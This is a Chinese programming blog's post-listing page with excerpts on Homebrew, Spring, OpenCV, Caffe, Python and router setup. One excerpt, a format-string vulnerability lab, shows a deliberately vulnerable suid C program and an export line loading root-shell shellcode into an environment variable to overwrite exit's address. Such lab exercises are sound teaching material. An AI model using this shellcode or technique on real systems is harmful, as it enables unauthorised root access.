<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程鬼谷子的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程鬼谷子的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcguiguzi.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程鬼谷子的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程鬼谷子的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程鬼谷子的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c00f71c4b9d0b353e69bae8dee49f997/" rel="bookmark">
			MacOSX系统下HomeBrew安装指定版本的软件 &amp; IntelliJ IDEA 设置多个Go语言版本开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HomeBrew安装指定版本的软件 快速多版本切换 通过 brew install [formula]@[tag] 安装多个版本，然后把其他版本移动到[formula]默认目录中，然后通过brew switch &lt;formula&gt; &lt;version&gt;切换 # 举例 安装多个go语言版本并切换 $ brew install go $ brew install go@1.10 $ brew install go@1.9 $ brew install go@1.8 # 然后把 go@1.10/go@1.9/go@1.8安装目录下的文件移动或者复制到go目录下 ，通过 brew switch go [version]切换版本 # 切换版本语法 brew switch &lt;formula&gt; &lt;version&gt; # 移动其他版本目录示例 MacBookPro:go mac$ pwd /usr/local/Cellar/go MacBookPro:go mac$ ls 1.10.3 1.11.2 1.11.4 MacBookPro:go mac$ cd ../go@1.10 MacBookPro:go@1.10 mac$ ls 1.10.7 MacBookPro:go@1.10 mac$ mv 1.10.7/ ../go/ # 把其他多个版本移动到go默认目录后，查看当前目录下有哪些go版本 MacBookPro:go mac$ ls 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c00f71c4b9d0b353e69bae8dee49f997/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52f3cf417c45533319e8f283435374cb/" rel="bookmark">
			毕设 - 用户登录 用cookie来实现会话跟踪
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：
1、我用的是postman进行后端接口测试，异步传值的时候出现了错误，先开始是不识别前端传来的json数据，是因为我的jackson版本太低了，重新导入了三个jackson包，后面又出现传值不正确的提示，根据源码看了一下是反射到方法时出现了错误，不应该在前台包装好json，直接传入即可；
2、乱码问题，前台页面乱码，这个问题应该好解决；
解决方案：我用的是thyemleaf集成的html页面，问题出在配置的时候只是配置了请求是utf-8编码，回应没有配置，默认还是iso-8859-1，具体解决代码在spring的xml文件下添加：
&lt;bean id="templateResolver" class="org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver"&gt; &lt;property name="prefix" value="" /&gt; &lt;property name="suffix" value=".html" /&gt; &lt;!-- HTML is the default value, added here for the sake of clarity. --&gt; &lt;property name="templateMode" value="HTML" /&gt; &lt;!-- 重中之重 --&gt; &lt;property name="characterEncoding" value="UTF-8"/&gt; &lt;!-- Template cache is true by default. Set to false if you want --&gt; &lt;!-- templates to be automatically updated when modified. --&gt; &lt;property name="cacheable" value="false" /&gt; &lt;/bean&gt; &lt;!-- SpringTemplateEngine automatically applies SpringStandardDialect and --&gt; &lt;!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/52f3cf417c45533319e8f283435374cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4807cc5d8e85a5057ad80351956cc93d/" rel="bookmark">
			【JSOI2016】病毒感染
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 题目大意：
就是说你要一来一回地走，求最少死亡人数。
设g[i][j]表示从i走到j再走会i的最少死亡人数 设f[i]表示1~i村庄都治疗了的最少死亡人数 #include&lt;cstdio&gt; #include&lt;cstring&gt; #include&lt;algorithm&gt; #define ll long long using namespace std; ll n,a[3010],s[3010],d; ll g[3010][3010],f[3010]; inline int read() { int x=0; char c=getchar(); while (c&lt;'0' || c&gt;'9') c=getchar(); while (c&gt;='0' &amp;&amp; c&lt;='9') x=(x&lt;&lt;1)+(x&lt;&lt;3)+(c^48),c=getchar(); return x; } int main() { n=read(); for (int i=1;i&lt;=n;i++) a[i]=read(),s[i]=s[i-1]+a[i]; for (int j=1;j&lt;n;j++) for (int i=1;i&lt;=n-j;i++) g[i][i+j]=g[i+1][i+j]+min((s[i+j]-s[i])*2,3*j*a[i]+s[i+j]-s[i]); memset(f,5,sizeof(f));f[0]=0; for (int i=1;i&lt;=n;i++) for (int j=0;j&lt;i;j++) f[i]=min(f[i],f[j]+g[j+1][i]+(3*(i-j-1)+i-j+1)*(s[n]-s[i])); printf("%lld\n",f[n]); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/522c411d82bf21316aba277d1767cb85/" rel="bookmark">
			Python练习：用户输入一个数字，打印每一位数字及其重复的次数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		# 用户输入一个数字，打印每一位数字及其重复的次数
n = "13211445"
dic = {}
for i in range(len(n)):
print(n[i])
if n[i] not in dic:
dic[n[i]] = 1
else:
dic[n[i]] += 1
print(dic)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e43199014b11e61008d365c362afe2f/" rel="bookmark">
			Format-String Vulnerability Lab  格式化字符串漏洞 （shellcode写进环境变量）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		// vul.c /* * 如果获得环境变量的程序和攻击的程序的文件名长度不一样，环境变量的地址 * 会发生偏移。因此，要么令两个程序的文件名长度相等（推荐），要么考虑偏 * 移来计算环境变量地址。 * gcc -z execstack -o got got.c */ #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(int argc, char **argv) { char buf[1024]; strncpy(buf, argv[1], sizeof(buf) - 1); printf(buf); puts("done"); exit(0); } 利用 root 把上面这段代码编译并且 suid，然后普通用户执行它，要求就是成 功获得 root shell。 观察以上代码,我们的思路是将shellcode写进环境变量，然后获取环境变量的地址，再将这个地址覆盖exit函数的地址，这样，在程序执行到exit(0)的时候，就会执行我们的shellcode。下面给出的get.c用于获取环境变量地址： //get.c //export EGG=$(python -c "print '\x90'*1000 + '\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80'") #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main(void) { printf("Egg address: %p ",getenv("EGG")); } 首先，关闭地址随机化：sudo sysctl -w kernel.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e43199014b11e61008d365c362afe2f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2317b14cedf14a658a6dbd3d4e6f1b51/" rel="bookmark">
			一文彻底明白linux中的selinux到底是什么
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言
安全增强型 Linux（Security-Enhanced Linux）简称 SELinux，它是一个 Linux 内核模块，也是 Linux 的一个安全子系统。
SELinux 主要由美国国家安全局开发。2.6 及以上版本的 Linux 内核都已经集成了 SELinux 模块。
SELinux 的结构及配置非常复杂，而且有大量概念性的东西，要学精难度较大。很多 Linux 系统管理员嫌麻烦都把 SELinux 关闭了。
如果可以熟练掌握 SELinux 并正确运用，我觉得整个系统基本上可以到达"坚不可摧"的地步了（请永远记住没有绝对的安全）。
掌握 SELinux 的基本概念以及简单的配置方法是每个 Linux 系统管理员的必修课。
本文均在 CentOS 7.4.1708 系统中操作。
本文纯属个人学习经验分享交流，出错再所难免，仅供参考！如果发现错误的地方，可以的话麻烦指点下，特别感谢！
二、SELinux 的作用及权限管理机制
2.1 SELinux 的作用
SELinux 主要作用就是最大限度地减小系统中服务进程可访问的资源（最小权限原则）。
设想一下，如果一个以 root 身份运行的网络服务存在 0day 漏洞，黑客就可以利用这个漏洞，以 root 的身份在您的服务器上为所欲为了。是不是很可怕？
SELinux 就是来解决这个问题的。
2.2 DAC
在没有使用 SELinux 的操作系统中，决定一个资源是否能被访问的因素是：某个资源是否拥有对应用户的权限（读、写、执行）。
只要访问这个资源的进程符合以上的条件就可以被访问。
而最致命问题是，root 用户不受任何管制，系统上任何资源都可以无限制地访问。
这种权限管理机制的主体是用户，也称为自主访问控制（DAC）。
2.3 MAC
在使用了 SELinux 的操作系统中，决定一个资源是否能被访问的因素除了上述因素之外，还需要判断每一类进程是否拥有对某一类资源的访问权限。
这样一来，即使进程是以 root 身份运行的，也需要判断这个进程的类型以及允许访问的资源类型才能决定是否允许访问某个资源。进程的活动空间也可以被压缩到最小。
即使是以 root 身份运行的服务进程，一般也只能访问到它所需要的资源。即使程序出了漏洞，影响范围也只有在其允许访问的资源范围内。安全性大大增加。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2317b14cedf14a658a6dbd3d4e6f1b51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d7aeff5cae3ffcaec47556445303380/" rel="bookmark">
			详细讨论Java中偏向锁、轻量级锁及重量级锁实现原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近因为工作关系遇到了很多Java并发编程的问题，然后恶补了一下，现在就来说说Java目前的锁实现原理
其实在JDK1.5以前的早期版本，还没有那么细粒度完善的锁机制，基本上就一个synchronized打遍天下，但是从JDK1.6之后Oracle对Java锁进行了很大的改动，也就出现了偏向锁/轻量级锁机制和锁的升级/降级机制
偏向锁和轻量级锁都属于乐观锁，偏向锁指的是没有其他线程竞争资源，只有一个线程在执行同步块代码，这个时候在会使用CAS操作在对象头部信息中写进拿到锁的那个线程ID/锁级别等信息，偏向锁的使用场景主要是为了提高执行性能，因为在大多数情况下并不存在频繁的多个线程对于同一个代码块进行竞争，那么就没必要同一个线程执行还执行拿锁/释放锁这种耗时操作，大致流程下图：
而当第一个拿到偏向锁的线程执行时，遇到有新的进程在询问统一代码块的锁时就有可能会升级成轻量级锁，为什么说是有可能呢？因为偏向锁不会自动释放，此时第2个线程询问锁时会出现2种情况：
第一个线程已经执行完毕，那么CAS操作将Mark Word设置为Null，第二个线程获取偏向锁，此时不会升级成轻量级锁第一个线程未执行完毕，此时第二个线程获取锁失败，那么会进行自旋，当自旋达到一定次数后，就会升级成轻量级锁 轻量级锁流程见下图：
同理，当需要获取锁的线程越来越多并且自旋达到一定数目后，就会升级成重量级锁，重量级锁也就是悲观锁，完全阻塞状态，必须等待线程执行完成释放锁之后排队线程才能挨个执行，这个就是锁的升级过程
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79b742b833d64cd576cbf6c502f9521d/" rel="bookmark">
			java调用SCPClient，文件从远程服务器复制到本地
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. 依赖ganymed-ssh2-build210.jar
二.代码
下面是复制整个目录中文件的代码，（也可以复制单个或指定后缀名的文件，需要改动）
点击查看更多
更多…
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e5f8036e8da8ca96bc6c67ec73a69a7/" rel="bookmark">
			【java】java下载文件中换行符   在windows和linux下通用的
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		请使用：
public static final String FILE_CONTENT_SPLIT_MARK = "\r\n"; 注意 不是"\n\r"，顺序很重要！！！！
注意，也不是
String str = System.getProperty("line.separator"); 转载于:https://www.cnblogs.com/sxdcgaq8080/p/10277679.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8681417ae7fe9051bd0e8c70e274ca13/" rel="bookmark">
			[Java] 用java实现的电影天堂,飘花电影网的电影的下载地址抓取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.之前看了一些论坛上有一个坛友用python写的抓取电影下载链接的，于是心血来潮的我也打算用java来写一个！其实并不是很难，下面附上代码 这是对电影天堂的电影的抓取的方法，（在此期间尝试设置代{过}{滤}理，以及用线程池，但貌似均没有成功） 说明下主要的jar包主要有httpclient4.5以及jsoup1.7
1. [Java] 纯文本查看 复制代码 ? 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 package downloade; import java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8681417ae7fe9051bd0e8c70e274ca13/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92c5f6035e8fcbbaaf56139ed4c220b8/" rel="bookmark">
			namespace &#34;cv&#34; 没有成员  &#34;face&#34; 问题记一下
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这是一个问题记录的帖子，并没有正面解决掉我的问题。调了好久之后没解决掉，问师兄发现这个模块没有用到。就给删掉了。
下面记录一下这个问题的常规解决办法。
文章目录 一：首先是opencv的版本是否合适二：然后是OpenCV的include路径配置三：这个文件是否在OpenCV的扩展包中我的分析过程 一：首先是opencv的版本是否合适 项目的版本低的话最好不要用高版本的OpenCV，最好是用当时开发的版本。
二：然后是OpenCV的include路径配置 视图 ==》其他窗口 ==》属性管理器，点击打开 2. 进入**属性管理器的窗口**，下边会有一个Debug|x64的文件夹，点开，下有名为Microsoft.Cpp.x64.user的文件，右键属性 （这个项目里，师兄原来新建了一个文件来专门管理OpenCV的路径和库文件配置问题，若是你的项目也有这个的话，就修改这里的，若是没有，则修改Microsoft.Cpp.x64.user） 然后选择通用属性下的VC++目录，右边会有包含目录和库目录，点击包含目录，添加以下三条路径，也就是OpenCV相关解压文件所在的目录 D:\opencv3.1\build\include D:\opencv3.1\build\include\opencv2 D:\opencv3.1\build\include\opencv 这三条路径要依据自己解压OpenCV3.1的路径进行修改
库目录增加以下路径 D:\opencv3.1\build\x64\vc14\lib 5. 还是刚才的属性页面 点击链接器，选择输入，会在右侧看到附加依赖项，添加下面文件 opencv_world310d.lib（前缀都一样，都是opencv_world，表示全局依赖项；310表示不同的版本；d表示debug版本，没有d表示release版本，此处添加debug版本） ![在这里插入图片描述](https://img-blog.csdnimg.cn/20190114231244604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3F1bnF1bnN0eWxlOTk=,size_16,color_FFFFFF,t_70) 注：然后在修改上面的内容时，一定要注意把旧的路径全部删干净。要不然容易找不到文件。
三：这个文件是否在OpenCV的扩展包中 官网下载的OpenCV库包只包含了基础功能的库文件，绝大多数的基础功能开发就够用了。像人脸识别的功能，就在扩展包里面了。opencv_contrib。但是要注意的是最好是摘到别人编译出来的包用，我下载了官方github上的库，是类似demo的文件，从里面抠出来的face包，但是并没有解决问题。嘿嘿嘿，最后直接删了完事。
我的分析过程 没有正面解决这个问题，只是记录一下我的分析过程。
配置好opencv3.4.0，新建项目可以打开图片，说明配置成功
导入原有项目，报错如下
老项目的opencv的版本是3.1.0，怀疑是版本的问题，按一下老版本的OpenCV试一下。
好吧，不是版本的问题，找了OpenCV2路径下所有的函数文件，发现没有face文件，是不是并没有人脸检测的内容，需要导进去啊？
face是在OpenCV的扩展包里，这个需要去下载，需要注意的是不要下载项目形式的扩展包，最好是下载别人重编译好的包。（我没有再去找合适的包，这一点大家去别的地方再看看吧。）
然后实在是想不明白，问了问师兄，说这个模块的功能其实没有用上，可以删掉。。。。。我这吭吭哧哧捣鼓了半天，师兄三把两把搞好了，还是说，有时候不能闭门造车，该问的时候，还是要问的。C++初上手，果然和java是有很大的区别。
嘿嘿嘿，纯属记录贴，没有帮上忙的话勿怪啊。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8fe04024acb4480f82052ab6372a3a2c/" rel="bookmark">
			[Bug集合]fatal error: pcl/visualization/pcl_visualizer.h: No such file or directory
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		找到这篇文章的你一定是看了SLAM14讲第五章来的，我解决这个问题大概用了三天。。
(小声bb：第五章根本用不上这个h文件，你注释掉就行)
主流装PCL大概我总结了一下。可以看一下这里。
出现这个bug有两种可能。
1 .依赖缺少，在编译和安装时没有在urs/include/plcX.X目录下生成pcl_visualizer.h。
先去这个目录下看一下是否是这种情况，如果没生成，请按照这篇文章重安装一边库和依赖，包括opencv和vtk。
之后重新解压你下载的PCL到一个新的文件夹，然后cmake走一走。
mkdir build cd build cmake -DCMAKE_BUILD_TYPE=None -DCMAKE_INSTALL_PREFIX=/usr -DBUILD_GPU=ON -DBUILD_apps=ON -DBUILD_examples=ON -DCMAKE_INSTALL_PREFIX=/usr .. make sudo make install 2.和我一样的奇特问题，原因大概是find函数不好使，所以我直接用绝对路径给出头文件，库文件地址。
cmake_minimum_required( VERSION 2.8 ) project( joinMap ) set( CMAKE_BUILD_TYPE Release ) set( CMAKE_CXX_FLAGS "-std=c++14 -O3" ) # opencv find_package( OpenCV REQUIRED ) include_directories( ${OpenCV_INCLUDE_DIRS} ) # eigen include_directories( "/usr/include/eigen3/" ) # pcl find_package( PCL 1.9 REQUIRED COMPONENT common io ) include_directories( "/usr/include/pcl-1.9/" ) add_definitions( "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8fe04024acb4480f82052ab6372a3a2c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33b99ae10d5afda63d1706f306fa398e/" rel="bookmark">
			python if &#39;a&#39; and &#39;b&#39; and &#39;c&#39; in &#39;abc&#39;的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求：想判断‘a’ ，‘b’ ，‘c’ 三个字符串都在‘abc’里在执行下条语句。
下面代码是错误的
if 'a' and 'b' and 'c' in 'abc' : print 'right' else : print 'Error'	正确写法
if 'a' in 'abcd' and 'b' in 'abcd' and 'c' in 'abc' : print 'right' else : print 'Error'	原因：python中if判断条件是判断语句是否为true，什么条件为true？有字符时就为true（除了bool类型的false）。
按第一种写法这种情况是判断不出来的。
if 'xxxxxxxxxxxx' and 'ababababddddddddddd' and 'c' in 'abc' : print 'right' else : print 'Error'	执行结果是：right，因为只判断了 ‘c’ in ‘abc’。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9952101b656f595e375369a94893267a/" rel="bookmark">
			《深入浅出Spring Boot 2.x》读书笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、整体感受2、内容提纲3、Spring Boot发展4、Spring IOC 及AOP5、访问数据库及数据库事务6、Redis-性能利器7、MongoDB8、Spring MVC8.1 Spring MVC运行流程8.2 HandlerMapping8.3 Controller参数8.4 参数验证8.5 数据模型（Model）8.6 视图（View）及视图解析器8.7 文件上传8.8 拦截器8.9 国际化 9、REST风格编程10、安全Spring Security11、其它 1、整体感受 这是一本讲述如何使用Spring Boot 2.x进行编程开发的技术书籍，全书围绕Spring Boot进行讲解，并且提供编程示例，示例简单易懂，而且作者确实是有相当丰富的开发经验，文章语言流畅，既讲到编程技术也对其中的原理有较好的描述，让读者知其然也知其所以然。其中重点对Spring MVC的使用进行了大篇幅的讲解，比较透彻。通过此书，基本对Spring Boot的Web开发有了整体了解，作为入门级的Spring Boot学习书籍，值得一读。
2、内容提纲 对于Spring的web开发，围绕的开发内容基本是属于Spring MVC，数据库访问，缓存处理，安全，分布式应用几个范畴，因此，书的大体结构也是分这几大部分，如下：
全书从Spring Boot的出现开始讲起，到基本的环境搭建，进而对Spring的IOC及AOP进行详细讲解。以此作为理论基础，接着进行数据库访问、Redis集成、MongoDB集成的开发，然后重点讲解了Spring MVC的开发。后面对Spring Security、REST风格、WebFlux、部署及监控，Spring Cloud进行了初步的介绍和使用。
下面对我读完后个人认为挺重要的内容做了个粗略的记录，也提醒自己在使用Spring Boot的过程中注意一下。
3、Spring Boot发展 回顾java web的开发，从最初的自己编写Servlet进行mapping，到后来Spring的引入而使用Struct，然后后来直接使用Spring MVC，通过XML配置实现web相关组件注入开发。再后来变成Spring MVC的注解方式进行装配，然后发展到现在Spring Boot，以全注解，自动装配的方式实现开发。基本经历这几波：
Spring MVC xml装配 -&gt; Spring MVC Servlet3.0注解装配 -&gt; Spring Boot全注解自动装配。
4、Spring IOC 及AOP Spring Boot是基于Spring的，Spring的核心是IOC和AOP，因此，作者也对这两个进行了比较通俗易发的讲解。
IOC：一种通过描述来生成或者获取对象的技术。 Spring IOC容器，具备两个基本功能
（1）bean的装配：通过描述管理bean，包括发布和获取bean；
（2）bean的依赖注入：通过描述完成bean之间的依赖关系。
Spring Boot中，bean装配，使用@Component注解；依赖注入，使用@Autowired注解。
Autowired流程：首先根据类型找到对应的bean，若对应类型的bean不是唯一的，它会根据其属性名和bean名称进行匹配，若仍无法匹配，则抛出异常。也可以使用@Qualifier进行bean名称标识。 Bean 生命周期 Bean 的初始化 AOP：面向切面编程 作者没有像其它书籍一样，直接讲解AOP的概念，而是提出的约定编程，并提供编码示例，以便于读者理解。其中，AOP最主要的是动态代理，包括JDK动态代理和CGLIB。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9952101b656f595e375369a94893267a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a816a17c0e8fec50b792751051c1477/" rel="bookmark">
			ubuntu16.04  caffe编译过程记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ubuntu16.04 caffe编译过程记录 1、在指定的目录下，下载需要编译的caffe 创建目录XXX，在该目录下右键打开终端，clone 需要编译的caffe
git clone https://github.com/BVLC/caffe.git 2、进入caffe目录，复制Makefile.config.example 到 Makefile.config 中，并编辑修改Makefile.config中内容 进入 caffe ，将 Makefile.config.example 文件复制一份并更名为 Makefile.config ，也可以在 caffe 目录下直接调用以下命令完成复制操作 ：
cd caffe ls sudo cp Makefile.config.example Makefile.config sudo gedit Makefile.config 打开Makefile.config文件，进行如下修改：
1.应用 cudnn
将 #USE_CUDNN := 1 修改成： USE_CUDNN := 1 2.应用 opencv 版本
将 #OPENCV_VERSION := 3 修改为： OPENCV_VERSION := 3 3.使用 python 接口
将 #WITH_PYTHON_LAYER := 1 修改为 WITH_PYTHON_LAYER := 1 4.修改 python 路径
INCLUDE_DIRS := $(PYTHON_INCLUDE) /usr/local/include LIBRARY_DIRS := $(PYTHON_LIB) /usr/local/lib /usr/lib 修改为： INCLUDE_DIRS := $(PYTHON_INCLUDE) /usr/local/include /usr/include/hdf5/serial LIBRARY_DIRS := $(PYTHON_LIB) /usr/local/lib /usr/lib /usr/lib/x86_64-linux-gnu /usr/lib/x86_64-linux-gnu/hdf5/serial 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a816a17c0e8fec50b792751051c1477/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2cff8c8902f9d7797e923d9fad61565/" rel="bookmark">
			【OpenCv3】 VS C&#43;&#43; （三）：图像识别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OpenCv专栏：https://blog.csdn.net/qq_40515692/article/details/102885061
以下代码均在VS配置的OpenCv3上运行成功，不需要其他额外配置。
使用关键点对目标进行识别是常用的方法。一般需要经过核心关键点检测、关键点过滤、匹配方法、结果显示等步骤。
具体可以参考opencv的官方文档：
https://docs.opencv.org/3.0-beta/doc/tutorials/features2d/trackingmotion/harris_detector/harris_detector.html#harris-detector
和《学习OpenCv3》第十六章-关键点和描述子
（1）.首先是核心关键点检测：角点检测Shi-Tomasi算法，它是Harris算法的改进。实际使用时记得改下图片的读取路径。
#include &lt;opencv2/opencv.hpp&gt; #include &lt;opencv2/imgproc.hpp&gt; #include &lt;vector&gt; using namespace std; using namespace cv; Mat g_src, g_gray; int g_num; void fun(int, void*) { vector&lt;Point2f&gt; corners; Mat copy = g_src.clone(); //角点检测Shi-Tomasi算法，Harris算法的改进 goodFeaturesToTrack(g_gray, corners, g_num, 0.01, 10, Mat(), 3, false, 0.04); RNG rng(12345);//随机数产生器 for (unsigned int i = 0; i &lt; corners.size(); i++) { //thickness = -1 // 如果是正数，表示组成圆的线条的粗细程度。 否则， 表示圆是否被填充 circle(copy, corners[i], 4, Scalar(rng.uniform(0, 255), rng.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2cff8c8902f9d7797e923d9fad61565/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b1dd8b10eebf644c891aee63f475aa4/" rel="bookmark">
			proteus 与 keil 的安装及联调
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		proteus 安装 Win10 系统的下载链接可以参考这里：https://tieba.baidu.com/p/5644915130?traceid=
百度网盘地址
链接1: http://pan.baidu.com/s/1kVdtfnx 密码: vaib
链接2: http://pan.baidu.com/s/1kUOsToF
keil 安装 还是在网上找个下载就行。可以参考这里：https://blog.csdn.net/ybhuangfugui/article/details/52932112
联调 proteus 项目完成后，直接双击 CPU 主控芯片，会弹出“编辑元器件”对话框，可以在这里选择“Program File”要运行的二进制代码文件。
如果只是单纯的运行一次，不需要调试，那这样完全没问题。但对于开发中的项目，经常需要 Debug 调试，单步执行并实时查看效果，那开启联调就很有必要了。
下载 vdmagi.exe 新版本的 proteus 可以通过这个软件傻瓜式配置，安装后即可使用。官网下载地址：http://downloads.labcenter.co.uk/vdmagi.exe
上面这个软件安装完成后，会在 Keil 的安装目录的 \C51\BIN 目录中添加 C51 联调相关的文件：VDM51.dll。如果安装的时候你还选了 ARM，还会自动添加 VMDARM.dll 这个文件。
实际上，这个软件做的事情不止这些，除了自动创建 dll 文件外，它还修改了修改 keil 安装目录下 Tools.ini文件，并在[C51] 栏目下加入
TDRV10=BIN\VDM51.DLL ("Proteus VSM Monitor-51 Driver" ) 其中“TDRV10” 中的 “10”要根据实际情况看，原则是不跟原来的重复。
开启 proteus 的远程调试功能 在菜单栏依次选择 “Debut”-&gt; “Enable Remote Debug Monitor”。开启后，proteus 会默认监听本机的 8000 端口。
编写 C51 代码并编译 打开 Keil 软件，编写项目代码，写完后编译为 Hex 文件。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b1dd8b10eebf644c891aee63f475aa4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0c7c6c89f580b55095615254d02fc8c/" rel="bookmark">
			通过IPV6公网远程访问路由（Padavan）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IPV6开始普及了，对于绝大多数IPV4是100、172、10之类开头的私网地址的用户来说，终于可以外网访问家用路由并用于文件传输，远程监控等了。
但是IPV6和V4并不兼容，家用级的路由也并不是都能得到IPV6地址，本文只讨论你已经获得了IPV6地址并能用之上网的情况。至于怎么配置获得IPV6的地址，另外开篇再说。
本文以 padavan和梅林路由系统举例：
如图已获得IPV6地址。
在自定义设置－脚本－在防火墙规则 (Emong’s Qos) 启动后执行: 的最后加入如下几行代码：
ip6tables -A INPUT -p tcp --dport 80 -j ACCEPT ip6tables -A OUTPUT -p tcp --sport 80 -j ACCEPT 以上两行为ipv6路由表充许80端口的输入输出，如图：
记得应用设置～即可在公网以IPV6地址访问家里的路由了。
IPV6的地址太长～不是一般人能记住的，我们再去申请一个域名，做AAAA域名解析到路由即可用域名访问。和IPV4类似，无非解析选AAAA即可。有很多免费的～找路由带DDNS的服务商方便点，比如阿里云Aiddns、梅林有he.net。
Padavan 自带的Aiddns中获取IPV6的代码：
ifconfig $(nvram get ppp0_ifname_t) ...... 在这行中，ppp0可能要改成 br0 视品牌型号而定。
ifconfig $(nvram get br0_ifname_t) ...... 梅林获取IPV6地址的代码要略复杂一点，另外再开篇说吧～
远程访问如图(IP)：
远程访问如图(域名)：
	</div>
</article><article class="list__item post">
	
